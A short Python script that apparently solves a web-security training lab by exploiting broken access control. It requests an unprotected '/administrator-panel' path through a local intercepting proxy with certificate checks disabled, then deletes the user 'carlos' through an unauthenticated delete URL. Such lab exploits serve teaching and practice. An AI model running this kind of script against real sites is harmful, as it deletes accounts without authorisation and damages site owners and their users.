import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080' , 'https': 'http://127.0.0.1:8080'}

def deleteUser(url):
    adminUrl = url + '/administrator-panel'
    req = requests.get(adminUrl, verify=False, proxies = proxies)
    if req.status_code == 200:
        print("(+) Admin Panel is Working on %s" % adminUrl)
        print("(+) Deleting Carlos User")
        carlosUrl = adminUrl + "/delete?username=carlos"
        req = requests.get(carlosUrl, verify=False, proxies = proxies)
        if req.status_code == 200:
            print("(+) Carlos has been deleted")
        else:
            print("(+) Cannot delete carlos user")
    else:
        print("(+) Cannot go for admin directory")
        print("(+) Exiting the script......")



def main():
    if(len(sys.argv) != 2):
        print("(+) Usage: %s URL " % sys.argv[0].split("/")[-1])
        print("Example: %s www.example.com" % sys.argv[0].split("/")[-1])
        sys.exit(-1)
    url = sys.argv[1]
    print("(+) Finding Admin Panel...")    
    deleteUser(url)


if __name__ == '__main__':
    main()